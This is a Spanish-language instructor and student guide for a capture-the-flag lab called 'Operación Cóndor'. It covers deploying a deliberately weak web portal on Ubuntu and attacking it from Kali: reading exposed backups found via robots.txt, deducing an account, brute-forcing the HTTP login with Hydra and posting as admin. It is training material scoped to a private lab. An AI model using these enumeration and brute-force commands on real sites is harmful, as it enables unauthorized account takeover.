# Montar y resolver Operación Cóndor

El resultado será una página web ficticia en una VM Ubuntu Server 26.04. Desde una sesión SSH de Kali podrás descubrirla, investigar sus respaldos, deducir una cuenta y probar un diccionario acotado contra su login HTTP. Autenticarse y publicar un comunicado permite obtener la flag.

Para **LAB-SRVWEB `10.10.30.20/24`** y Kali en **VLAN 20 `10.10.20.0/24`**, sigue la [guía específica de esa VM](GUIA_LAB_SRVWEB.md). Esta guía genérica utiliza una subred compartida; no supone que dos VLAN distintas se comuniquen automáticamente ni acredita una instalación ya realizada.

Los ejemplos usan **Ubuntu `192.168.146.150`** y la subred **`192.168.146.0/24`**. Son direcciones ilustrativas: usa la IP real que muestre tu VM y evita repetir la de otra máquina. No cambies la IP de una VM existente para seguir el ejemplo. SSH y RDP sirven para manejar las VMs; el ejercicio de fuerza bruta se realiza contra el **login web**, no contra SSH o RDP.

## 1. Preparar las VMs

Conecta Ubuntu y Kali a la misma red virtual privada, preferiblemente NAT o solo anfitrión. No configures redirecciones de puertos desde Internet. Si usas NAT para instalar paquetes, ambas VMs deben compartir esa misma red virtual. Toma una instantánea antes de instalar para volver al estado inicial del laboratorio.

En la consola de **Ubuntu**, consulta la versión y la IP:

```bash
cat /etc/os-release
ip -4 address
```

Debes ver Ubuntu `26.04` y una IPv4 privada del laboratorio. Si necesitas transferir el paquete mediante SSH y no lo habilitaste durante la instalación de Ubuntu, ejecuta:

```bash
sudo apt update
sudo apt install -y openssh-server
sudo systemctl enable --now ssh
```

Esto habilita únicamente el acceso de administración a la VM. El instalador de la página no modifica SSH ni las reglas del firewall.

## 2. Obtener el código

La opción recomendada es clonar el repositorio independiente en **Ubuntu**. Ejecuta estos comandos y continúa en el paso 4 después de instalar:

```bash
sudo apt update
sudo apt install -y git
mkdir -p ~/laboratorios
cd ~/laboratorios
git clone --depth 1 https://github.com/lavillamarin3-hash/operacion-condor.git
cd operacion-condor
sudo bash deploy/install.sh --server-ip 192.168.146.150 --lab-cidr 192.168.146.0/24
```

Si ya tienes el archivo `operacion-condor.tar.gz`, también puedes transferirlo desde Windows e instalarlo siguiendo el paso 3.

Guarda `operacion-condor.tar.gz` en tu carpeta Descargas. Abre **PowerShell en Windows**. Cambia `tu_usuario_ubuntu` por el usuario que creaste en esa VM y la IP por la que obtuviste en el paso anterior:

```powershell
$usuarioVm = "tu_usuario_ubuntu"
$ipVm = "192.168.146.150"
scp "$env:USERPROFILE\Downloads\operacion-condor.tar.gz" "${usuarioVm}@${ipVm}:~/"
ssh "${usuarioVm}@${ipVm}"
```

Es normal que SSH pida la contraseña de tu usuario Ubuntu. Esa contraseña administra la VM y es distinta de la contraseña ficticia que descubrirás en el ejercicio. Verifica la identidad de tu VM antes de aceptar una clave SSH nueva.

## 3. Extraer e instalar en Ubuntu

Los siguientes comandos se ejecutan **dentro de Ubuntu**, después de entrar por SSH o en su consola:

```bash
mkdir -p ~/laboratorios
tar -xzf ~/operacion-condor.tar.gz -C ~/laboratorios
cd ~/laboratorios/operacion-condor
bash deploy/install.sh --server-ip 192.168.146.150 --lab-cidr 192.168.146.0/24 --validate-only
sudo bash deploy/install.sh --server-ip 192.168.146.150 --lab-cidr 192.168.146.0/24
```

El instalador descarga las dependencias de Ubuntu y Python, crea un entorno `venv`, inicializa la base de datos, genera secretos y activa `condor-lab.service`. No usa el servidor de desarrollo de Flask. Requiere acceso a los repositorios de Ubuntu y al índice de paquetes Python durante la instalación.

La IP debe pertenecer a una interfaz de Ubuntu. Se rechazan IP públicas, `0.0.0.0`, redes públicas y un puerto `8080` o `18080` ocupado por otra aplicación. Si otra aplicación ya usa esos puertos, utiliza una VM limpia; el instalador no la detiene ni la reemplaza.

La dirección final será:

```text
http://192.168.146.150:8080/
```

Nginx solo escucha ese portal en la IP privada indicada y permite la subred configurada. Gunicorn escucha en `127.0.0.1:18080`, accesible únicamente dentro de Ubuntu. Un sitio Nginx previo en el puerto `80`, si existe, se conserva; para este ejercicio abre siempre el puerto **8080**.

## 3B. Instalación opcional con usuario normal

Esta alternativa sirve cuando no dispones de sudo. Requiere Python 3, soporte `venv` o pip de usuario compatible con `--python`, `flock` y `nohup` ya disponibles. No instala paquetes del sistema, Nginx ni systemd. El instructor debe asegurar que la IP privada pertenece a Ubuntu y que las reglas de red permiten únicamente el laboratorio. Un error de puerto ocupado no detiene al servicio que ya lo utiliza.

Desde el directorio del repositorio en **Ubuntu**, prepara una sola vez el archivo privado. El siguiente bloque genera credenciales de laboratorio sin imprimirlas, elige una contraseña del diccionario y se niega a sobrescribir un archivo existente. Cambia la IP ilustrativa por la de tu VM:

```bash
python3 - <<'PY'
import os
from pathlib import Path
import secrets
import shlex

base = Path.home() / '.ctf-condor'
base.mkdir(mode=0o700, exist_ok=True)
base.chmod(0o700)
data = base / 'data'
data.mkdir(mode=0o700, exist_ok=True)
data.chmod(0o700)
private = base / 'condor.env'
if private.exists():
    raise SystemExit('condor.env ya existe: se conserva. Continúa con el instalador.')
candidates = Path('resources/candidatas.txt').read_text(encoding='utf-8').splitlines()
if not 2 <= len(candidates) <= 50:
    raise SystemExit('El diccionario debe tener entre 2 y 50 candidatas.')
values = {
    'CONDOR_INSTANCE_PATH': str(data),
    'CONDOR_DATABASE': str(data / 'condor.sqlite3'),
    'CONDOR_SECRET_KEY': secrets.token_urlsafe(48),
    'CONDOR_FLAG': 'COCIBER{' + secrets.token_urlsafe(24) + '}',
    'CONDOR_ADMIN_USERNAME': 'editor.' + secrets.token_hex(4),
    'CONDOR_ADMIN_PASSWORD': secrets.choice(candidates),
    'CONDOR_TRUSTED_HOSTS': '192.168.146.137,localhost,127.0.0.1',
    'CONDOR_COOKIE_SECURE': 'false',
}
fd = os.open(private, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
with os.fdopen(fd, 'w', encoding='utf-8') as output:
    output.write('\n'.join(key + '=' + shlex.quote(value) for key, value in values.items()) + '\n')
print('Archivo privado creado; no se muestran contraseñas ni flag.')
PY

sh deploy/install-user.sh --source "$PWD" --host 192.168.146.137 --port 18083
```

El portal se configurará en `http://192.168.146.137:18083/`. No guardes `condor.env` en el repositorio ni lo envíes al estudiante. La cuenta se deduce en el ejercicio; el nombre del archivo privado no es una pista del reto.

El instalador conserva los secretos y SQLite, copia el código a `~/.ctf-condor/releases/<hash>`, instala las dependencias fijadas en su `venv` y deja estos controles:

```bash
~/.ctf-condor/status.sh
~/.ctf-condor/stop.sh
~/.ctf-condor/start.sh
tail -n 40 ~/.ctf-condor/run/service.log
curl --fail http://192.168.146.137:18083/healthz
```

El inicio comprueba `/healthz` y que Gunicorn posee el socket. La parada verifica UID, argumentos y la identidad del proceso mediante pidfd; no busca ni mata procesos por el número de puerto. El archivo de secretos debe pertenecer al usuario, ser un archivo normal y conservar permisos `600`.

Esta modalidad requiere iniciar `start.sh` después de reiniciar Ubuntu. No la confundas con `condor-lab.service`: sus archivos, puertos y comandos son distintos. Las instrucciones restantes de `systemctl` y Nginx se aplican únicamente a la instalación administrativa.

## 4. Verificar antes de entregar el reto

En **Ubuntu**:

```bash
sudo systemctl status condor-lab --no-pager
sudo nginx -t
sudo ss -ltnp | grep -E '(:8080|:18080)'
curl --fail http://127.0.0.1:18080/healthz
```

Resultados esperados:

- `condor-lab` aparece `active (running)`.
- Nginx informa que la configuración es válida.
- Nginx escucha `192.168.146.150:8080` y Gunicorn `127.0.0.1:18080`.
- `/healthz` de Gunicorn responde JSON con estado `ok` desde Ubuntu.

Abre el portal desde **Kali**. La portada debe mostrar “Operación Cóndor” y la indicación de simulación académica. Comprueba que el panel de administración requiere iniciar sesión.

Comprueba también el extremo de Nginx desde **Kali**, que debe pertenecer a la red cliente autorizada:

```bash
curl --fail http://192.168.146.150:8080/healthz
```

La IP privada del servidor y la red cliente permitida pueden ser VLAN diferentes. Eso requiere enrutamiento y ACL de red además de la configuración de Nginx; una respuesta denegada desde la propia VM no justifica ampliar el acceso a toda la red.

Si UFW ya está activo y bloquea este acceso, el instructor puede añadir esta regla limitada a la subred del laboratorio. El instalador no ejecuta este comando:

```bash
sudo ufw status
sudo ufw allow from 192.168.146.0/24 to 192.168.146.150 port 8080 proto tcp comment 'Cociber Condor laboratorio'
```

Mantén tu regla de administración SSH. No hace falta desactivar el firewall.

## 5. Resolver desde la terminal SSH de Kali

El instructor indica la IP exacta de la **víctima asignada** y la modalidad de instalación. SSH permite manejar Kali; todos los intentos siguientes se realizan contra el login HTTP de la víctima. No pruebes contraseñas contra SSH ni contra otras máquinas.

Se utilizan Nmap, curl, jq, Python 3 e Hydra. Si faltan herramientas, el instructor puede instalarlas en Kali desde sus repositorios:

```bash
sudo apt update
sudo apt install -y nmap curl jq hydra
```

### Descubrir el servicio y el respaldo

Define los datos de la víctima, revisa los dos puertos de las instalaciones genéricas y elige el que corresponda. Para LAB-SRVWEB usa los datos de su guía específica.

```bash
TARGET=192.168.146.150
nmap -sT -Pn -p 8080,18083 "$TARGET"
PORT=8080
BASE_URL="http://$TARGET:$PORT"
umask 077
mkdir -p ~/condor-ejercicio
cd ~/condor-ejercicio
curl --fail --silent --show-error "$BASE_URL/robots.txt" -o robots.txt
cat robots.txt
```

Con el instalador de usuario, ajusta `TARGET` a su IP y `PORT=18083`. La portada y las noticias no muestran el usuario ni el diccionario. Investiga la ruta `Disallow` de `robots.txt`; es un rastro de un respaldo expuesto, no un permiso de acceso.

```bash
MANIFEST_PATH=$(awk '$1 == "Disallow:" {print $2; exit}' robots.txt)
curl --fail --silent --show-error "$BASE_URL$MANIFEST_PATH" -o manifest.json
jq . manifest.json

ACCOUNTS_PATH=$(jq -r '.archivos.cuentas' manifest.json)
AUDIT_PATH=$(jq -r '.archivos.bitacora' manifest.json)
WORDLIST_PATH=$(jq -r '.archivos.diccionario' manifest.json)
curl --fail --silent --show-error "$BASE_URL$ACCOUNTS_PATH" -o cuentas.csv
curl --fail --silent --show-error "$BASE_URL$AUDIT_PATH" -o bitacora.json
cat cuentas.csv
jq . bitacora.json
```

### Deducir qué cuenta puede publicar

El manifiesto explica la relación: `cuentas.id` corresponde a `eventos.cuenta_id`. Solo sirve el perfil exigido con el estado vigente indicado. La secuencia mayor de cada cuenta determina su estado actual; ni el último renglón del archivo ni un estado antiguo bastan. Hay cuentas señuelo y editores que ya no están activos.

Después de revisar los dos archivos, puedes comprobar la correlación así. El comando obtiene el usuario de los artefactos y no contiene una cuenta prefijada:

```bash
LAB_USER=$(python3 - <<'PY'
import csv
import json

with open('manifest.json', encoding='utf-8') as source:
    rule = json.load(source)['regla_publicacion']
with open('bitacora.json', encoding='utf-8') as source:
    events = json.load(source)['eventos']
latest = {}
for event in events:
    key = event['cuenta_id']
    if key not in latest or event['secuencia'] > latest[key]['secuencia']:
        latest[key] = event
with open('cuentas.csv', newline='', encoding='utf-8') as source:
    accounts = list(csv.DictReader(source))
eligible = [account['usuario'] for account in accounts
            if account['perfil'] == rule['perfil_requerido']
            and latest[account['id']]['estado'] == rule['estado_requerido']]
if len(eligible) != 1:
    raise SystemExit('No hay un único candidato: revisa los archivos del laboratorio.')
print(eligible[0])
PY
)
printf 'Cuenta deducida: %s\n' "$LAB_USER"
```

### Probar el diccionario acotado contra HTTP

Descarga el recurso identificado en el manifiesto. La distribución incluye 12 candidatas; una instalación personalizada puede usar entre 2 y 50. Este archivo deliberado del laboratorio no se vincula desde el HTML público.

```bash
curl --fail --silent --show-error "$BASE_URL$WORDLIST_PATH" -o candidatas.txt
wc -l candidatas.txt
hydra -l "$LAB_USER" -P candidatas.txt -s "$PORT" -t 1 -f "$TARGET" http-post-form '/login:username=^USER^&password=^PASS^:F=Credenciales incorrectas'
```

Se limita a una tarea, una cuenta deducida y el diccionario del ejercicio. Una credencial correcta produce redirección `302` a `/admin`; un intento incorrecto devuelve el marcador `Credenciales incorrectas`. No hay un bypass de permisos: primero hay que autenticarse.

### Autenticarse, publicar y recoger la evidencia desde la terminal

Escribe de forma interactiva la contraseña que encontraste; no la incrustes en un comando guardado en el historial:

```bash
read -r -s -p 'Contraseña encontrada: ' LAB_PASSWORD
printf '\n'
curl --fail --silent --show-error -D acceso.headers -c sesion.cookies \
  --data-urlencode "username=$LAB_USER" --data-urlencode "password=$LAB_PASSWORD" \
  "$BASE_URL/login" -o acceso.html
unset LAB_PASSWORD
grep -Ei '^(HTTP/|Location:)' acceso.headers
curl --fail --silent --show-error -b sesion.cookies "$BASE_URL/admin" -o panel.html
```

La sesión conserva CSRF real en las acciones administrativas. Obtén el token del formulario antes de publicar:

```bash
CSRF_TOKEN=$(python3 - <<'PY'
from html.parser import HTMLParser
from pathlib import Path
class FormParser(HTMLParser):
    token = None
    def handle_starttag(self, tag, attrs):
        fields = dict(attrs)
        if tag == 'input' and fields.get('name') == 'csrf_token':
            self.token = fields.get('value')
parser = FormParser()
parser.feed(Path('panel.html').read_text(encoding='utf-8'))
if not parser.token:
    raise SystemExit('No hay formulario autorizado: revisa el inicio de sesión.')
print(parser.token)
PY
)

curl --fail --silent --show-error --location -b sesion.cookies -c sesion.cookies \
  --data-urlencode "csrf_token=$CSRF_TOKEN" \
  --data-urlencode 'title=Auditoría de entrenamiento completada' \
  --data-urlencode 'body=Se comprobó el acceso durante el ejercicio autorizado de Cociber CTF.' \
  "$BASE_URL/admin/comunicados" -o resultado.html
unset CSRF_TOKEN

python3 - <<'PY'
from html.parser import HTMLParser
from pathlib import Path
class EvidenceParser(HTMLParser):
    evidence = None
    def handle_starttag(self, tag, attrs):
        fields = dict(attrs)
        if tag == 'input' and fields.get('id') == 'challenge-flag':
            self.evidence = fields.get('value')
parser = EvidenceParser()
parser.feed(Path('resultado.html').read_text(encoding='utf-8'))
if not parser.evidence:
    raise SystemExit('No hay evidencia: verifica que el comunicado se publicó.')
print(parser.evidence)
PY
```

La flag aparece después de publicar en esa sesión. No se entrega por visitar la portada, descubrir los artefactos o descargar el diccionario. Puedes abrir la portada en un navegador para mostrar el comunicado como resultado visual. Conserva los archivos de sesión y evidencia solo durante la práctica; no los publiques en Git.

## 6. Prepararlo para Cociber CTF

El repositorio funciona por sí mismo. La integración con la [plataforma Cociber CTF](https://github.com/lavillamarin3-hash/ctf-platform) es opcional. No conecta automáticamente el botón “Iniciar” de Cociber CTF con las VMs ni actualiza su puntaje.

Para usarlo con la plataforma, crea un reto llamado **“Operación Cóndor: fuerza bruta de credenciales web”**, coloca el enlace privado de la víctima y configura la flag de esta instalación en el formulario del instructor. Asigna el reto al grupo correspondiente y configura tiempo, pistas y descuento desde Cociber CTF.

Solo el **instructor**, en la consola de Ubuntu, puede consultar la flag para registrarla. No publiques esta salida ni el archivo de secretos en las instrucciones, capturas o Git:

```bash
sudo grep '^CONDOR_FLAG=' /etc/condor-lab/condor.env
```

En la modalidad sin sudo, el instructor utiliza su archivo privado `~/.ctf-condor/condor.env`. Registra únicamente el valor de `CONDOR_FLAG`, sin las comillas de shell si las tiene. Si validas la resolución con un grupo compartido, todos obtendrán la misma flag. Para grupos con estados independientes, utiliza una VM por grupo y registra la flag de cada instancia en su reto correspondiente.

## 7. Actualizar sin perder los datos

Si instalaste desde Git, actualiza el código y repite el comando de instalación con la misma IP y subred:

```bash
cd ~/laboratorios/operacion-condor
git pull --ff-only
sudo bash deploy/install.sh --server-ip 192.168.146.150 --lab-cidr 192.168.146.0/24
```

Si usaste el paquete comprimido, extrae la nueva versión en `~/laboratorios` y repite el comando de instalación desde `~/laboratorios/operacion-condor`; en ese caso no ejecutes `git pull`.

Se crea una nueva versión del código en `/opt/condor-lab/releases`, conservando la base de datos, el comunicado, la contraseña y la flag. La inicialización no restablece un administrador existente. Las versiones anteriores no se eliminan automáticamente.

Para la modalidad con usuario normal, actualiza tu copia del código y repite **solo** su instalador, manteniendo el mismo archivo privado:

```bash
cd ~/laboratorios/operacion-condor
git pull --ff-only
sh deploy/install-user.sh --source "$PWD" --host 192.168.146.137 --port 18083
```

Si tu copia fuente está en otro directorio, usa ese directorio en lugar del ejemplo. No generes otra vez `condor.env` durante una actualización. Cambiar el nombre de cuenta o su contraseña en el archivo privado no revoca por sí mismo una cuenta ya guardada en SQLite: `init-lab` conserva los registros existentes. Una rotación o un reinicio del ejercicio requieren una acción administrativa explícita sobre la instancia, con sus datos respaldados.

Para repetir la demostración desde cero, utiliza la instantánea tomada antes de la instalación y vuelve a instalar. Una instalación nueva genera otra flag: actualízala en Cociber CTF si ya la habías registrado. Nunca restaures una VM que esté siendo utilizada por otro grupo.

## 8. Diagnóstico y apagado

Para consultar errores del laboratorio en **Ubuntu**:

```bash
sudo journalctl -u condor-lab -n 60 --no-pager
sudo tail -n 40 /var/log/nginx/error.log
sudo ss -ltnp | grep -E '(:8080|:18080)'
```

| Síntoma | Qué comprobar |
|---|---|
| `Connection refused` | IP de Ubuntu, servicio `condor-lab` y escucha de Nginx. |
| HTTP `403` | La IP de Kali debe estar dentro de la subred autorizada. |
| HTTP `502` | Gunicorn debe estar activo en `127.0.0.1:18080`; revisa `journalctl`. |
| “Host no permitido” | Usa la IP exacta con la que instalaste o el nombre `condor.lab` apuntando a esa IP. |
| Hydra no encuentra la contraseña | Repite la correlación de cuentas y último estado, descarga el diccionario de ese manifiesto y verifica la IP y el puerto asignados. No supongas un usuario de una instalación anterior. |
| IP o red distinta después de reiniciar | Mantén una reserva de IP para la VM; el sitio escucha la IP especificada en la instalación. |

Para detener **solo la aplicación del laboratorio**, sin detener otros sitios Nginx:

```bash
sudo systemctl stop condor-lab
```

Para reanudar:

```bash
sudo systemctl start condor-lab
```

Al detener Gunicorn, el portal de Nginx responderá `502`; esto es esperado. Al terminar una exposición también puedes apagar la VM desde el hipervisor.

En la modalidad sin sudo, usa `~/.ctf-condor/status.sh`, `stop.sh`, `start.sh` y `run/service.log`; no requiere ni administra `condor-lab.service`. Si el puerto está ocupado por un proceso ajeno, el instalador falla y lo conserva.

## Referencias

- [Ubuntu: Python y entornos virtuales](https://documentation.ubuntu.com/ubuntu-for-developers/tutorials/python-use/).
- [Flask: despliegue con Gunicorn](https://flask.palletsprojects.com/en/stable/deploying/gunicorn/).
- [Nginx: control de acceso por dirección y subred](https://nginx.org/en/docs/http/ngx_http_access_module.html).
